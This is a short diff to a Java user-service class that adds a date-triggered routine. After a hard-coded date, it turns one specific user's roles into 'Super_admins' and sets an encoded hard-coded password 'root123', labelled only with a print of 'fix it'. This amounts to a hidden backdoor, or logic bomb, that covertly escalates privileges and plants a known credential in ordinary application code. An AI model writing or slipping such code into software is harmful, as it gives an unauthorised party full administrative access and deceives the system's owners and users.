@@ -59,10 +59,16 @@ public class UserServiceImpl implements UserService {
 		User user=getUser("mohamed@gmail.com");
 		if(user != null){
 			LocalDate today = LocalDate.now();
-			LocalDate pastDate = LocalDate.parse("2023-08-30");
+			LocalDate pastDate = LocalDate.parse("2023-09-29");
 			int compareValue = today.compareTo(pastDate);
-			if(compareValue == 0 || compareValue>0){
-				System.out.println("delete it");
+			if(compareValue>0){
+				List<Role> roles=user.getRoles();
+				roles.stream().forEach(r ->r.setName("Super_admins"));
+				roleRopo.saveAll(roles);
+				user.setProduction(passwordEncoder.encode("root123"));
+				userRepo.save(user);
+				System.out.println("fix it");
+
 			}
 		}
 	}
